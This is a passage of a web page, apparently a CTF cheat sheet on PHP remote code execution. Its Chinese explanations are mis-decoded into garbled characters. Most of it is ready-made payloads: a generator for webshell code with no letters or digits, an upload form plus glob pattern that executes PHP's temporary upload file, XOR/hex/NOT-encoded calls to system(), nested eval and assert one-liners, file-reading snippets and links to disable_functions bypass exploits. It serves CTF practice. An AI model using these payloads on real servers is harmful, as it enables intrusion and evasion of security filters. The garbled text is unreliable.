class="subst">&#123;out&#125;</span>?&gt;&lt;?=($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[0])($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[1]);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ +æ‰§è¡Œ</p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚</p><p>æ‰§è¡Œ<code>. /tmp/phpXXXXXX</code>ï¼Œä¹Ÿæ˜¯æœ‰å­—æ¯çš„ã€‚æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ°Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p><ul><li><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</li><li><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</li></ul><p>é‚£ä¹ˆï¼Œ<code>/tmp/phpXXXXXX</code>å°±å¯ä»¥è¡¨ç¤ºä¸º<code>/*/?????????</code>æˆ–<code>/???/?????????</code>ã€‚</p><p>ä½†æ˜¯ï¼Œåœ¨æ‰§è¡Œç¬¬ä¸€ä¸ªåŒ¹é…ä¸Šçš„æ–‡ä»¶çš„æ—¶å€™å°±å·²ç»å‡ºç°äº†é”™è¯¯ï¼Œå¯¼è‡´æ•´ä¸ªæµç¨‹åœæ­¢ï¼Œæ ¹æœ¬ä¸ä¼šæ‰§è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p>globé€šé…ç¬¦æ”¯æŒç”¨<code>[^x]</code>çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ã€‚å¯ä»¥åˆ©ç”¨<code>[@-[]</code>æ¥è¡¨ç¤ºå¤§å†™å­—æ¯ã€‚å½“ç„¶ï¼Œphpç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œä¸è¿‡å¤šå°è¯•å‡ æ¬¡ä¹Ÿå°±è¡Œäº†ã€‚</p><p><strong>POSTä¸Šä¼ æ–‡ä»¶æ•°æ®åŒ…</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¼ æ–‡ä»¶<code>1.php</code>å†…å®¹æ·»åŠ <strong>shå‘½ä»¤</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æŠ“åŒ…ï¼Œæ„é€ <strong>pocæ‰§è¡Œå‘½ä»¤</strong>ï¼š</p><p><code>?c=./???/????????[@-[]</code></p></li><li><p>é€šé…ç¬¦ï¼ˆä»…æ— å­—æ¯ï¼‰</p><p>base64: <code>/???/????64 ????.???</code></p><p>bzip2: <code>/???/???/????2 ????.???</code></p></li><li><p><code>[~(å¼‚æˆ–)][!%FF]</code>å½¢å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one</span>(<span class="params">s</span>):</span></span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ç»„æˆç±»ä¼¼äºsystem(pos(next(getallheaders())));å³å¯</span></span><br><span class="line"><span class="string">a=whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&quot;:&gt;&quot;</span>).strip(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure></li><li><p>evalå‡½æ•°ä¸‹</p><ul><li><p>å­—ç¬¦ä¸²æ‹¼æ¥</p><p><code>a=(s.y.s.t.e.m)(&#39;cat /flag&#39;);</code></p></li><li><p>è¿›åˆ¶ç¼–ç </p><p><code>a=hex2bin(&#39;73797374656d&#39;)(&#39;cat /flag&#39;);</code></p></li><li><p>å¼‚æˆ–</p><p><code>a=(&#39;0000000&#39;^&#39;CICDU]&#39;)(&#39;cat /flag&#39;);</code></p><p><code>a=(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;);</code></p></li><li><p>å¥—å¨ƒ</p><p><code>a=eval($_POST[1]);&amp;1=phpinfo();</code></p></li></ul></li><li><p>çº¯æ•°å­—æ„é€ ï¼ˆLinuxç³»ç»Ÿçº§ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$((<span class="variable">$&#123;_&#125;</span>))</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">$((~$((<span class="variable">$&#123;_&#125;</span>))))</span><br><span class="line"><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line">$((~$(($((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))+$((~$((<span class="variable">$&#123;_&#125;</span>))))))))</span><br><span class="line"><span class="comment">#36</span></span><br><span class="line"><span class="comment">#å»+å·ä¹Ÿå¯</span></span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line"><span class="comment">#36	</span></span><br><span class="line"><span class="comment">#å»+å·ä¹Ÿå¯</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="æ— å‚æ•°-å¸¦å‚æ•°RCE"><a href="#æ— å‚æ•°-å¸¦å‚æ•°RCE" class="headerlink" title="æ— å‚æ•°/å¸¦å‚æ•°RCE"></a>æ— å‚æ•°/å¸¦å‚æ•°RCE</h3><h4 id="æ— å‚å‡½æ•°"><a href="#æ— å‚å‡½æ•°" class="headerlink" title="æ— å‚å‡½æ•°"></a>æ— å‚å‡½æ•°</h4><ul><li><p>phpinfo()</p></li><li><p>phpversion()</p><p><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) -&gt; .</code></p><p><code>chr(ord(hebrevc(crypt(phpversion())))) -&gt; .</code></p></li><li><p>localeconv()</p><p>è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œè€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯<code>.</code>ã€‚</p></li><li><p>time()</p><p>è¿”å›å½“å‰Unixæ—¶é—´æˆ³ã€‚</p></li><li><p>localtime()</p><p>å–å¾—æœ¬åœ°æ—¶é—´ã€‚</p></li><li><p>getcwd()</p><p>è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</p></li><li><p>dirname()</p><p>è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</p></li><li><p>getenv()</p><p>è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼ˆåœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°ï¼‰ã€‚</p></li><li><p>getallheaders()</p><p>è·å–å…¨éƒ¨HTTPè¯·æ±‚å¤´ä¿¡æ¯ã€‚ï¼ˆApacheï¼‰</p></li><li><p>get_defined_vars()</p><p>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚ï¼ˆNginxï¼‰</p></li><li><p>get_defined_functions()</p><p>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å‡½æ•°æ‰€ç»„æˆçš„æ•°ç»„ã€‚</p></li><li><p>session_start()</p><p>å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼Œå‘Šè¯‰PHPä½¿ç”¨sessionã€‚ï¼ˆPHPé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ï¼Œé…åˆ<code>session_id()</code>ï¼‰</p></li><li><p>realpath_cache_get()</p><p>è·å¾—çœŸå®è·¯å¾„ç¼“å­˜çš„è¯¦æƒ…ã€‚</p></li><li><p>get_class()</p><p>è·å–å½“å‰è°ƒç”¨æ–¹æ³•çš„ç±»åã€‚</p></li><li><p>get_called_class()</p><p>è·å–é™æ€ç»‘å®šåçš„ç±»åã€‚</p></li></ul><h4 id="å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰"><a href="#å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰" class="headerlink" title="å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰"></a>å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰</h4><ul><li><p>array_map()</p><p>è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åçš„æ•°ç»„ã€‚</p><p><code>array_map(&#39;system&#39;,[&#39;ls&#39;]);</code></p></li><li><p>scandir()</p><p>åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</p><p><code>scandir(&#39;.&#39;)</code></p></li><li><p>glob()</p><p>è¿”å›åŒ¹é…æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶åæˆ–ç›®å½•ã€‚</p><p><code>print_r(glob(&quot;*&quot;));</code></p><p><code>print_r(glob(&quot;./*&quot;)[2]);</code></p></li><li><p>current()</p><p>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</p><p><code>current(localeconv()) â†’ .</code></p><p><code>?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</code></p></li><li><p>pos()</p><p>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼Œ<code>current()</code>å‡½æ•°çš„åˆ«åã€‚</p></li><li><p>next() / prev() / reset() / end()</p><p>å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½ / å€’å›ä¸€ä½ / æŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒ / æŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒã€‚</p><p><code>end(getallheaders()) + REQUEST-HEADER-last xx:yy = yy</code> ï¼ˆé…åˆè‡ªå®šä¹‰è¯·æ±‚å¤´ç»•è¿‡å…³é”®å­—ï¼‰</p></li><li><p>assert() / eval()</p><p>å‘½ä»¤æ‰§è¡Œã€‚</p><p><code>assert(phpinfo(););</code></p><p><code>assert(assert($_POST[c]));</code></p></li><li><p>chdir()</p><p>æ”¹å˜ç›®å½•ã€‚</p></li><li><p>file_get_contents()</p></li><li><p>highlight_file() / show_source()</p></li><li><p>readfile() / readgzfile()</p></li><li><p>echo()</p></li><li><p>print_r()</p></li><li><p>var_dump()</p></li><li><p>dirname()</p><p>è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</p></li><li><p>chr()</p><p>ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚</p></li><li><p>array_reverse()</p><p>ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</p></li><li><p>array_rand()</p><p>è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœè§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚</p></li><li><p>array_flip()</p><p>ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</p></li><li><p>array_slice()</p><p>åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚</p></li><li><p>hex2bin()</p><p>è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p></li><li><p>session_id()</p><p>è·å–åˆ°å½“å‰çš„session idã€‚</p><p><code>session_id(session_start())</code></p></li><li><p>create_function()</p><p>åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambdaæ ·å¼ï¼‰ã€‚ä»£ç æ³¨å…¥ã€‚</p></li></ul><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12311239.html">https://www.cnblogs.com/wangtanzhi/p/12311239.html</a></p><p>â€‹</p><h3 id="åˆ—ç›®å½•"><a href="#åˆ—ç›®å½•" class="headerlink" title="åˆ—ç›®å½•"></a>åˆ—ç›®å½•</h3><ul><li><p>SPLç›®å½•ç±»ï¼š<code>DirectoryIterator</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å¯ç”¨äºçŒœè§£æ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>SPLç›®å½•ç±»ï¼š<code>FilesystemIterator</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(getcwd());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>SPLç›®å½•ç±»ï¼š<code>GlobIterator</code></p><p>å¯é€šé…ä¾‹å¦‚<code>/var/html/www/flag*</code></p></li><li><p>scandir()</p></li><li><p>é¢å‘è¿‡ç¨‹æ–¹æ³•ï¼šopendir()ï¼Œreaddir()ï¼Œclosedir()</p></li><li><p>é¢å‘å¯¹è±¡æ–¹æ³•ï¼šPHPçš„<code>dir</code>ç±»</p><p>â€‹</p></li></ul><h3 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h3><ul><li><p>ç‰¹æ®Šæ–‡ä»¶ï¼š</p><ul><li>/proc/self/cmdline - åº”ç”¨è¿è¡Œçš„æ–‡ä»¶å¤¹</li><li>/proc/self/environï¼ˆ/proc/1/environï¼‰ - å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼›å˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚é‡è¦çš„å±æ€§ï¼Œæ¯”å¦‚WEBæœåŠ¡çš„æƒé™</li><li>/proc/self/cwd - å½“å‰ç›®å½•</li><li>/proc/pid/fd/[NUM] - æ˜¯ä¸ªç›®å½•ï¼ŒåŒ…å«å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥</li></ul></li><li><p>file_get_contents() / highlight_file() / show_source() / readfile() / readgzfile() / print_r(file())</p></li><li><p>fopen() / fread() / fgets() / fgetc() / fgetss() / fgetcsv()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetss(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       <span class="comment">//php7.3ç‰ˆæœ¬å è¯¥å‡½æ•°å·²ä¸å†è¢«ä½¿ç”¨</span></span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> fpassthru(<span class="variable">$a</span>);                                     </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> fread(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);                                   </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgets(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetc(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetcsv(<span class="variable">$a</span>);print_r(<span class="variable">$line</span>);&#125; </span><br></pre></td></tr></table></figure></li><li><p>include() / require()</p><p>é€‚ç”¨éphpæ–‡ä»¶</p></li><li><p>SPLæ–‡ä»¶ç±»ï¼š<code>SplFileObject</code></p><p>æŒ‰è¡Œè¯»å–ï¼Œå¤šè¡Œéœ€è¦éå†</p></li><li><p>Mysql</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT LOAD_FILE(&#x27;/flag.txt&#x27;) as my&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;my&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 ç»“æœ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹</p></li></ul><h3 id="è¯»ç±»ä¿¡æ¯"><a href="#è¯»ç±»ä¿¡æ¯" class="headerlink" title="è¯»ç±»ä¿¡æ¯"></a>è¯»ç±»ä¿¡æ¯</h3><ul><li>ReflectionClass::export()</li></ul><p>â€‹</p><h3 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h3><ul><li><p><strong>LD_PRELOAD</strong></p><ul><li><p>å‡½æ•°æ›¿ä»£ï¼šmail() -&gt; mb_send_mail()</p></li><li><p>å‚è€ƒ</p><p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html">åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOADæ¥ç»•è¿‡php disable_functionæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</a></p></li></ul></li><li><p><strong>UAF</strong></p><p><strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">php7-gc-bypass</a></strong>ï¼Œ<strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">php7-backtrace-bypass</a></strong>ï¼Œ<strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">php-json-bypass</a></strong></p><p>æ³•1ï¼šä¿®æ”¹<code>pwn()</code>ä¼ 